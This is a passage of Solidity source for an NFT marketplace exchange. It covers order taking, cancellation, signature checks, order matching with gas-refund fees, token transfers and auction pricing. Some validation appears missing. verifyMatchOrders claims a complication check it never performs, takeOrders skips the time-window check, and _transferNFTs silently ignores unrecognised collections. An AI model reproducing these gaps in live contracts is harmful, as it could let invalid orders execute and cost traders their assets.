makerOrderHash), 'invalid maker order');\n      bool isTimeValid = makerOrders[i].constraints[3] <= block.timestamp &&\n        makerOrders[i].constraints[4] >= block.timestamp;\n      require(isTimeValid, 'invalid time');\n      require(currency == makerOrders[i].execParams[1], 'cannot mix currencies');\n      require(isMakerSeller == makerOrders[i].isSellOrder, 'cannot mix order sides');\n      uint256 execPrice = _getCurrentPrice(makerOrders[i]);\n      totalPrice += execPrice;\n      _execTakeOneOrder(makerOrderHash, makerOrders[i], isMakerSeller, execPrice);\n      unchecked {\n        ++i;\n      }\n    }\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    }\n  }\n\n  /**\n   @notice Batch buys or sells orders where maker orders can have unspecified NFTs. Transaction initiated by an end user.\n   @param makerOrders The orders to fulfill\n   @param takerNfts The specific NFTs that the taker is willing to take that intersect with the higher order intent of the maker\n   Example: If a makerOrder is 'buy any one of these 2 specific NFTs', then the takerNfts would be 'this one specific NFT'.\n  */\n  function takeOrders(OrderTypes.MakerOrder[] calldata makerOrders, OrderTypes.OrderItem[][] calldata takerNfts)\n    external\n    payable\n    nonReentrant\n  {\n    uint256 ordersLength = makerOrders.length;\n    require(ordersLength == takerNfts.length, 'mismatched lengths');\n    uint256 totalPrice;\n    address currency = makerOrders[0].execParams[1];\n    bool isMakerSeller = makerOrders[0].isSellOrder;\n    if (!isMakerSeller) {\n      require(currency != address(0), 'offers only in ERC20');\n    }\n    for (uint256 i = 0; i < ordersLength; ) {\n      require(currency == makerOrders[i].execParams[1], 'cannot mix currencies');\n      require(isMakerSeller == makerOrders[i].isSellOrder, 'cannot mix order sides');\n      uint256 execPrice = _getCurrentPrice(makerOrders[i]);\n      totalPrice += execPrice;\n      _takeOrders(makerOrders[i], takerNfts[i], execPrice);\n      unchecked {\n        ++i;\n      }\n    }\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    }\n  }\n\n  /**\n   @notice Helper function (non exchange related) to send multiple NFTs in one go\n   @param to The orders to fulfill\n   @param items The specific NFTs to transfer\n  */\n  function transferMultipleNFTs(address to, OrderTypes.OrderItem[] calldata items) external nonReentrant {\n    _transferMultipleNFTs(msg.sender, to, items);\n  }\n\n  /**\n   * @notice Cancel all pending orders\n   * @param minNonce minimum user nonce\n   */\n  function cancelAllOrders(uint256 minNonce) external {\n    require(minNonce > userMinOrderNonce[msg.sender], 'nonce too low');\n    require(minNonce < userMinOrderNonce[msg.sender] + 1000000, 'too many');\n    userMinOrderNonce[msg.sender] = minNonce;\n    emit CancelAllOrders(msg.sender, minNonce);\n  }\n\n  /**\n   * @notice Cancel multiple orders\n   * @param orderNonces array of order nonces\n   */\n  function cancelMultipleOrders(uint256[] calldata orderNonces) external {\n    uint256 numNonces = orderNonces.length;\n    require(numNonces > 0, 'cannot be empty');\n    for (uint256 i = 0; i < numNonces; ) {\n      require(orderNonces[i] >= userMinOrderNonce[msg.sender], 'nonce too low');\n      require(!isUserOrderNonceExecutedOrCancelled[msg.sender][orderNonces[i]], 'nonce already executed or cancelled');\n      isUserOrderNonceExecutedOrCancelled[msg.sender][orderNonces[i]] = true;\n      unchecked {\n        ++i;\n      }\n    }\n    emit CancelMultipleOrders(msg.sender, orderNonces);\n  }\n\n  // ====================================================== VIEW FUNCTIONS ======================================================\n\n  /**\n   * @notice Check whether user order nonce is executed or cancelled\n   * @param user address of user\n   * @param nonce nonce of the order\n   * @return whether nonce is valid\n   */\n  function isNonceValid(address user, uint256 nonce) external view returns (bool) {\n    return !isUserOrderNonceExecutedOrCancelled[user][nonce] && nonce > userMinOrderNonce[user];\n  }\n\n  /**\n   * @notice Check whether a user signed order has valid signature\n   * @param order the order to verify\n   * @return whether order has valid signature\n   */\n  function verifyOrderSig(OrderTypes.MakerOrder calldata order) external view returns (bool) {\n    // Verify the validity of the signature\n    (bytes32 r, bytes32 s, uint8 v) = abi.decode(order.sig, (bytes32, bytes32, uint8));\n    return SignatureChecker.verify(_hash(order), order.signer, r, s, v, DOMAIN_SEPARATOR);\n  }\n\n  /**\n   * @notice Checks whether orders are valid\n   * @dev Checks whether currencies match, sides match, complications match and if each order is valid (see isOrderValid)\n   * @param sellOrderHash hash of the sell order\n   * @param buyOrderHash hash of the buy order\n   * @param sell the sell order\n   * @param buy the buy order\n   * @return whether orders are valid\n   */\n  function verifyMatchOneToOneOrders(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy\n  ) public view returns (bool) {\n    bool currenciesMatch = sell.execParams[1] == buy.execParams[1] ||\n      (sell.execParams[1] == address(0) && buy.execParams[1] == WETH);\n    return (sell.isSellOrder &&\n      !buy.isSellOrder &&\n      sell.execParams[0] == buy.execParams[0] &&\n      currenciesMatch &&\n      isOrderValid(sell, sellOrderHash) &&\n      isOrderValid(buy, buyOrderHash));\n  }\n\n  /**\n   * @notice Checks whether orders are valid\n   * @dev Checks whether currencies match, sides match, complications match and if each order is valid (see isOrderValid)\n   * @param orderHash hash of the order\n   * @param sell the sell order\n   * @param buy the buy order\n   * @return whether orders are valid\n   */\n  function verifyMatchOneToManyOrders(\n    bytes32 orderHash,\n    bool verifySellOrder,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy\n  ) public view returns (bool) {\n    bool currenciesMatch = sell.execParams[1] == buy.execParams[1] ||\n      (sell.execParams[1] == address(0) && buy.execParams[1] == WETH);\n    bool _orderValid;\n    if (verifySellOrder) {\n      _orderValid = isOrderValid(sell, orderHash);\n    } else {\n      _orderValid = isOrderValid(buy, orderHash);\n    }\n    return (sell.isSellOrder &&\n      !buy.isSellOrder &&\n      sell.execParams[0] == buy.execParams[0] &&\n      currenciesMatch &&\n      _orderValid);\n  }\n\n  /**\n   * @notice Checks whether orders are valid\n   * @dev Checks whether currencies match, sides match, complications match and if each order is valid (see isOrderValid)\n          Also checks if the given complication can execute this order\n   * @param sellOrderHash hash of the sell order\n   * @param buyOrderHash hash of the buy order\n   * @param sell the sell order\n   * @param buy the buy order\n   * @return whether orders are valid and the execution price\n   */\n  function verifyMatchOrders(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy\n  ) public view returns (bool) {\n    bool currenciesMatch = sell.execParams[1] == buy.execParams[1] ||\n      (sell.execParams[1] == address(0) && buy.execParams[1] == WETH);\n    return (sell.isSellOrder &&\n      !buy.isSellOrder &&\n      sell.execParams[0] == buy.execParams[0] &&\n      currenciesMatch &&\n      isOrderValid(sell, sellOrderHash) &&\n      isOrderValid(buy, buyOrderHash));\n  }\n\n  /**\n   * @notice Verifies the validity of the order\n   * @dev checks whether order nonce was cancelled or already executed, \n          if signature is valid and if the complication and currency are valid\n   * @param order the order\n   * @param orderHash computed hash of the order\n   */\n  function isOrderValid(OrderTypes.MakerOrder calldata order, bytes32 orderHash) public view returns (bool) {\n    bool orderExpired = isUserOrderNonceExecutedOrCancelled[order.signer][order.constraints[5]] ||\n      order.constraints[5] < userMinOrderNonce[order.signer];\n    // Verify the validity of the signature\n    (bytes32 r, bytes32 s, uint8 v) = abi.decode(order.sig, (bytes32, bytes32, uint8));\n    bool sigValid = SignatureChecker.verify(orderHash, order.signer, r, s, v, DOMAIN_SEPARATOR);\n    if (\n      orderExpired ||\n      !sigValid ||\n      order.signer == address(0) ||\n      !_complications.contains(order.execParams[0]) ||\n      !_currencies.contains(order.execParams[1])\n    ) {\n      return false;\n    }\n    return true;\n  }\n\n  /// @notice returns the number of complications supported by the exchange\n  function numComplications() external view returns (uint256) {\n    return _complications.length();\n  }\n\n  /// @notice returns the complication at the given index\n  function getComplicationAt(uint256 index) external view returns (address) {\n    return _complications.at(index);\n  }\n\n  /// @notice returns whether a given complication is valid\n  function isValidComplication(address complication) external view returns (bool) {\n    return _complications.contains(complication);\n  }\n\n  /// @notice returns the number of currencies supported by the exchange\n  function numCurrencies() external view returns (uint256) {\n    return _currencies.length();\n  }\n\n  /// @notice returns the currency at the given index\n  function getCurrencyAt(uint256 index) external view returns (address) {\n    return _currencies.at(index);\n  }\n\n  /// @notice returns whether a given currency is valid\n  function isValidCurrency(address currency) external view returns (bool) {\n    return _currencies.contains(currency);\n  }\n\n  // ====================================================== INTERNAL FUNCTIONS ================================================\n\n  /**\n   * @notice Internal helper function to match orders one to one\n   * @param makerOrder1 first order\n   * @param makerOrder2 second maker order\n   * @param startGasPerOrder start gas when this order started execution\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _matchOneToOneOrders(\n    OrderTypes.MakerOrder calldata makerOrder1,\n    OrderTypes.MakerOrder calldata makerOrder2,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    OrderTypes.MakerOrder calldata sell = makerOrder1.isSellOrder ? makerOrder1 : makerOrder2;\n    OrderTypes.MakerOrder calldata buy = makerOrder1.isSellOrder ? makerOrder2 : makerOrder1;\n    bytes32 sellOrderHash = _hash(sell);\n    bytes32 buyOrderHash = _hash(buy);\n    require(verifyMatchOneToOneOrders(sellOrderHash, buyOrderHash, sell, buy), 'order not verified');\n    _execMatchOneToOneOrders(\n      sellOrderHash,\n      buyOrderHash,\n      sell,\n      buy,\n      startGasPerOrder,\n      execPrice,\n      protocolFeeBps,\n      wethTransferGasUnits,\n      weth\n    );\n  }\n\n  /**\n   * @notice Internal helper function to match one maker sell order to many maker buys\n   * @param sellOrderHash sell order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param startGasPerOrder start gas when this order started execution\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _matchOneMakerSellToManyMakerBuys(\n    bytes32 sellOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 startGasPerOrder,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    bytes32 buyOrderHash = _hash(buy);\n    require(verifyMatchOneToManyOrders(buyOrderHash, false, sell, buy), 'order not verified');\n    _execMatchOneMakerSellToManyMakerBuys(\n      sellOrderHash,\n      buyOrderHash,\n      sell,\n      buy,\n      startGasPerOrder,\n      _getCurrentPrice(buy),\n      protocolFeeBps,\n      wethTransferGasUnits,\n      weth\n    );\n  }\n\n  /**\n   * @notice Internal helper function to match one maker buy order to many maker sells\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param protocolFeeBps exchange fee\n   */\n  function _matchOneMakerBuyToManyMakerSells(\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint16 protocolFeeBps\n  ) internal returns (uint256) {\n    bytes32 sellOrderHash = _hash(sell);\n    require(verifyMatchOneToManyOrders(sellOrderHash, true, sell, buy), 'order not verified');\n    return\n      _execMatchOneMakerBuyToManyMakerSells(\n        sellOrderHash,\n        buyOrderHash,\n        sell,\n        buy,\n        _getCurrentPrice(sell),\n        protocolFeeBps\n      );\n  }\n\n  /**\n   * @notice Internal helper function to match orders specified via a higher order intent\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param constructedNfts the nfts constructed by an off chain matching that are guaranteed to intersect\n            with the user specified signed intents (orders)\n   * @param startGasPerOrder start gas when this order started execution\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _matchOrders(\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    OrderTypes.OrderItem[] calldata constructedNfts,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    bytes32 sellOrderHash = _hash(sell);\n    bytes32 buyOrderHash = _hash(buy);\n    require(verifyMatchOrders(sellOrderHash, buyOrderHash, sell, buy), 'order not verified');\n    _execMatchOrders(\n      sellOrderHash,\n      buyOrderHash,\n      sell,\n      buy,\n      constructedNfts,\n      startGasPerOrder,\n      execPrice,\n      protocolFeeBps,\n      wethTransferGasUnits,\n      weth\n    );\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers for match one to one orders\n   * @dev Updates order nonce states, does asset transfers and emits events. Also refunds gas expenditure to the contract\n   * @param sellOrderHash sell order hash\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param startGasPerOrder start gas when this order started execution\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _execMatchOneToOneOrders(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[sell.signer][sell.constraints[5]] = true;\n    isUserOrderNonceExecutedOrCancelled[buy.signer][buy.constraints[5]] = true;\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _transferMultipleNFTs(sell.signer, buy.signer, sell.nfts);\n    // transfer final amount (post-fees) to seller\n    IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, sell.signer, remainingAmount);\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n    uint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice;\n    // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n    // else we need to send the protocol fee separately in the execution currency\n    if (buy.execParams[1] == weth) {\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), protocolFee + gasCost);\n    } else {\n      IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, address(this), protocolFee);\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), gasCost);\n    }\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers for match one sell to many buy orders\n   * @dev Updates order nonce states, does asset transfers and emits events. Also refunds gas expenditure to the contract\n   * @param sellOrderHash sell order hash\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param startGasPerOrder start gas when this order started execution\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _execMatchOneMakerSellToManyMakerBuys(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[buy.signer][buy.constraints[5]] = true;\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _execMatchOneToManyOrders(sell.signer, buy.signer, buy.nfts, buy.execParams[1], remainingAmount);\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n    uint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice;\n    // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n    // else we need to send the protocol fee separately in the execution currency\n    if (buy.execParams[1] == weth) {\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), protocolFee + gasCost);\n    } else {\n      IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, address(this), protocolFee);\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), gasCost);\n    }\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers for match one buy to many sell orders\n   * @dev Updates order nonce states, does asset transfers and emits events. Gas expenditure refund is done in the caller\n          since it does not need to be done in a loop\n   * @param sellOrderHash sell order hash\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @return the protocolFee so that the buyer can pay the protocol fee and gas cost in one go\n   */\n  function _execMatchOneMakerBuyToManyMakerSells(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 execPrice,\n    uint16 protocolFeeBps\n  ) internal returns (uint256) {\n    isUserOrderNonceExecutedOrCancelled[sell.signer][sell.constraints[5]] = true;\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _execMatchOneToManyOrders(sell.signer, buy.signer, sell.nfts, buy.execParams[1], remainingAmount);\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n    return protocolFee;\n  }\n\n  /// @dev this helper purely exists to help reduce contract size a bit and avoid any stack too deep errors\n  function _execMatchOneToManyOrders(\n    address seller,\n    address buyer,\n    OrderTypes.OrderItem[] calldata constructedNfts,\n    address currency,\n    uint256 amount\n  ) internal {\n    _transferMultipleNFTs(seller, buyer, constructedNfts);\n    // transfer final amount (post-fees) to seller\n    IERC20(currency).safeTransferFrom(buyer, seller, amount);\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers for match orders\n   * @dev Updates order nonce states, does asset transfers, emits events and does gas refunds\n   * @param sellOrderHash sell order hash\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param constructedNfts the constructed nfts\n   * @param startGasPerOrder gas when this order started execution\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth weth address\n   */\n  function _execMatchOrders(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    OrderTypes.OrderItem[] calldata constructedNfts,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _execMatchOrder(\n      sell.signer,\n      buy.signer,\n      sell.constraints[5],\n      buy.constraints[5],\n      constructedNfts,\n      buy.execParams[1],\n      remainingAmount\n    );\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n    uint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice;\n    // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n    // else we need to send the protocol fee separately in the execution currency\n    if (buy.execParams[1] == weth) {\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), protocolFee + gasCost);\n    } else {\n      IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, address(this), protocolFee);\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), gasCost);\n    }\n  }\n\n  /// @dev this helper purely exists to help reduce contract size a bit and avoid any stack too deep errors\n  function _execMatchOrder(\n    address seller,\n    address buyer,\n    uint256 sellNonce,\n    uint256 buyNonce,\n    OrderTypes.OrderItem[] calldata constructedNfts,\n    address currency,\n    uint256 amount\n  ) internal {\n    // Update order execution status to true (prevents replay)\n    isUserOrderNonceExecutedOrCancelled[seller][sellNonce] = true;\n    isUserOrderNonceExecutedOrCancelled[buyer][buyNonce] = true;\n    _transferMultipleNFTs(seller, buyer, constructedNfts);\n    // transfer final amount (post-fees) to seller\n    IERC20(currency).safeTransferFrom(buyer, seller, amount);\n  }\n\n  function _emitMatchEvent(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    address seller,\n    address buyer,\n    address complication,\n    address currency,\n    uint256 amount\n  ) internal {\n    emit MatchOrderFulfilled(sellOrderHash, buyOrderHash, seller, buyer, complication, currency, amount);\n  }\n\n  /**\n   * @notice Internal helper function to take orders\n   * @dev verifies whether order can be executed\n   * @param makerOrder the maker order\n   * @param takerItems nfts to be transferred\n   * @param execPrice execution price\n   */\n  function _takeOrders(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.OrderItem[] calldata takerItems,\n    uint256 execPrice\n  ) internal {\n    bytes32 makerOrderHash = _hash(makerOrder);\n    bool makerOrderValid = isOrderValid(makerOrder, makerOrderHash);\n    bool executionValid = IComplication(makerOrder.execParams[0]).canExecTakeOrder(makerOrder, takerItems);\n    require(makerOrderValid && executionValid, 'order not verified');\n    _execTakeOrders(makerOrderHash, makerOrder, takerItems, makerOrder.isSellOrder, execPrice);\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers \n              for take orders specifying a higher order intent\n   * @dev Updates order nonce state, does asset transfers and emits events\n   * @param makerOrderHash maker order hash\n   * @param makerOrder the maker order\n   * @param takerItems nfts to be transferred\n   * @param isMakerSeller is the maker order a sell order\n   * @param execPrice execution price\n   */\n  function _execTakeOrders(\n    bytes32 makerOrderHash,\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.OrderItem[] calldata takerItems,\n    bool isMakerSeller,\n    uint256 execPrice\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n    if (isMakerSeller) {\n      _transferNFTsAndFees(makerOrder.signer, msg.sender, takerItems, execPrice, makerOrder.execParams[1]);\n      _emitTakerEvent(makerOrderHash, makerOrder.signer, msg.sender, makerOrder, execPrice);\n    } else {\n      _transferNFTsAndFees(msg.sender, makerOrder.signer, takerItems, execPrice, makerOrder.execParams[1]);\n      _emitTakerEvent(makerOrderHash, msg.sender, makerOrder.signer, makerOrder, execPrice);\n    }\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers \n              for simple take orders\n   * @dev Updates order nonce state, does asset transfers and emits events\n   * @param makerOrderHash maker order hash\n   * @param makerOrder the maker order\n   * @param isMakerSeller is the maker order a sell order\n   * @param execPrice execution price\n   */\n  function _execTakeOneOrder(\n    bytes32 makerOrderHash,\n    OrderTypes.MakerOrder calldata makerOrder,\n    bool isMakerSeller,\n    uint256 execPrice\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n    if (isMakerSeller) {\n      _transferNFTsAndFees(makerOrder.signer, msg.sender, makerOrder.nfts, execPrice, makerOrder.execParams[1]);\n      _emitTakerEvent(makerOrderHash, makerOrder.signer, msg.sender, makerOrder, execPrice);\n    } else {\n      _transferNFTsAndFees(msg.sender, makerOrder.signer, makerOrder.nfts, execPrice, makerOrder.execParams[1]);\n      _emitTakerEvent(makerOrderHash, msg.sender, makerOrder.signer, makerOrder, execPrice);\n    }\n  }\n\n  function _emitTakerEvent(\n    bytes32 orderHash,\n    address seller,\n    address buyer,\n    OrderTypes.MakerOrder calldata order,\n    uint256 amount\n  ) internal {\n    emit TakeOrderFulfilled(orderHash, seller, buyer, order.execParams[0], order.execParams[1], amount);\n  }\n\n  /**\n   * @notice Transfers NFTs and fees\n   * @param seller the seller\n   * @param buyer the buyer\n   * @param nfts nfts to transfer\n   * @param amount amount to transfer\n   * @param currency currency of the transfer\n   */\n  function _transferNFTsAndFees(\n    address seller,\n    address buyer,\n    OrderTypes.OrderItem[] calldata nfts,\n    uint256 amount,\n    address currency\n  ) internal {\n    // transfer NFTs\n    _transferMultipleNFTs(seller, buyer, nfts);\n    // transfer fees\n    _transferFees(seller, buyer, amount, currency);\n  }\n\n  /**\n   * @notice Transfers multiple NFTs in a loop and ERC1155s in a batch\n   * @param from the from address\n   * @param to the to address\n   * @param nfts nfts to transfer\n   */\n  function _transferMultipleNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem[] calldata nfts\n  ) internal {\n    uint256 numNfts = nfts.length;\n    for (uint256 i = 0; i < numNfts; ) {\n      _transferNFTs(from, to, nfts[i]);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  /**\n   * @notice Transfer NFTs\n   * @param from address of the sender\n   * @param to address of the recipient\n   * @param item item to transfer\n   */\n  function _transferNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {\n      _transferERC721s(from, to, item);\n    } else if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {\n      _transferERC1155s(from, to, item);\n    }\n  }\n\n  /**\n   * @notice Transfer ERC721s\n   * @param from address of the sender\n   * @param to address of the recipient\n   * @param item item to transfer\n   */\n  function _transferERC721s(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    uint256 numTokens = item.tokens.length;\n    for (uint256 i = 0; i < numTokens; ) {\n      IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  /**\n   * @notice Transfer ERC1155s\n   * @dev uses the ERC1155 batchTransfer function for efficient transfers\n   * @param from address of the sender\n   * @param to address of the recipient\n   * @param item item to transfer\n   */\n  function _transferERC1155s(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    uint256 numNfts = item.tokens.length;\n    uint256[] memory tokenIdsArr = new uint256[](numNfts);\n    uint256[] memory numTokensPerTokenIdArr = new uint256[](numNfts);\n    for (uint256 i = 0; i < numNfts; ) {\n      tokenIdsArr[i] = item.tokens[i].tokenId;\n      numTokensPerTokenIdArr[i] = item.tokens[i].numTokens;\n      unchecked {\n        ++i;\n      }\n    }\n    IERC1155(item.collection).safeBatchTransferFrom(from, to, tokenIdsArr, numTokensPerTokenIdArr, '0x0');\n  }\n\n  /**\n   * @notice Transfer fees. Fees are always transferred from buyer to the seller and the exchange although seller is \n            the one that actually 'pays' the fees\n   * @dev if the currency ETH, no additional transfer is needed to pay exchange fees since the contract is 'payable'\n   * @param seller the seller\n   * @param buyer the buyer\n   * @param amount amount to transfer\n   * @param currency currency of the transfer\n   */\n  function _transferFees(\n    address seller,\n    address buyer,\n    uint256 amount,\n    address currency\n  ) internal {\n    // protocol fee\n    uint256 protocolFee = (PROTOCOL_FEE_BPS * amount) / 10000;\n    uint256 remainingAmount = amount - protocolFee;\n    // ETH\n    if (currency == address(0)) {\n      // transfer amount to seller\n      (bool sent, ) = seller.call{value: remainingAmount}('');\n      require(sent, 'failed to send ether to seller');\n    } else {\n      // transfer final amount (post-fees) to seller\n      IERC20(currency).safeTransferFrom(buyer, seller, remainingAmount);\n      // send fee to protocol\n      IERC20(currency).safeTransferFrom(buyer, address(this), protocolFee);\n    }\n  }\n\n  // =================================================== UTILS ==================================================================\n\n  /// @dev Gets current order price for orders that vary in price over time (dutch and reverse dutch auctions)\n  function _getCurrentPrice(OrderTypes.MakerOrder calldata order) internal view returns (uint256) {\n    (uint256 startPrice, uint256 endPrice) = (order.constraints[1], order.constraints[2]);\n    uint256 duration = order.constraints[4] - order.constraints[3];\n    uint256 priceDiff = startPrice > endPrice ? startPrice - endPrice : endPrice - startPrice;\n    if (priceDiff == 0 || duration == 0) {\n      return startPrice;\n    }\n    uint256 elapsedTime = block.timestamp - order.constraints[3];\n    uint256 PRECISION = 10**4; // precision for division; similar to bps\n    uint256 portionBps = elapsedTime > duration ? PRECISION : ((elapsedTime * PRECISION) / duration);\n    priceDiff = (priceDiff * portionBps) / PRECISION;\n    return startPrice > endPrice ? startPrice - priceDiff : startPrice + priceDiff;\n  }\n\n  /// @dev hashes the given order with the help of _nftsHash and _tokensHash\n  function _hash(OrderTypes.MakerOrder calldata order) internal pure returns (bytes32) {\n    // keccak256('Order(bool isSellOrder,address signer,uint256[] constraints,OrderItem[] nfts,address[] execParams,bytes extraParams)OrderItem(address collection,TokenInfo[] tokens)TokenInfo(uint256 tokenId,uint256 numTokens)')\n    bytes32 ORDER_HASH = 0x7bcfb5a29031e6b8d34ca1a14dd0a1f5cb11b20f755bb2a31ee3c4b143477e4a;\n    return\n      keccak256(\n        abi.encode(\n          ORDER_HASH,\n          order.isSellOrder,\n          order.signer,\n          keccak256(abi.encodePacked(order.constraints)),\n          _nftsHash(order.nfts),\n          keccak256(abi.encodePacked(order.execParams)),\n          keccak256(order.extraParams)\n        )\n      );\n  }\n\n  function _nftsHash(OrderTypes.OrderItem[] calldata nfts) internal pure returns (bytes32) {\n    // keccak256('OrderItem(address collection,TokenInfo[] tokens)TokenInfo(uint256 tokenId,uint256 numTokens)')\n    bytes32 ORDER_ITEM_HASH = 0xf73f37e9f570369ceaab59cef16249ae1c0ad1afd592d656afac0be6f63b87e0;\n    uint256 numNfts = nfts.length;\n    bytes32[] memory hashes = new bytes32[](numNfts);\n    for 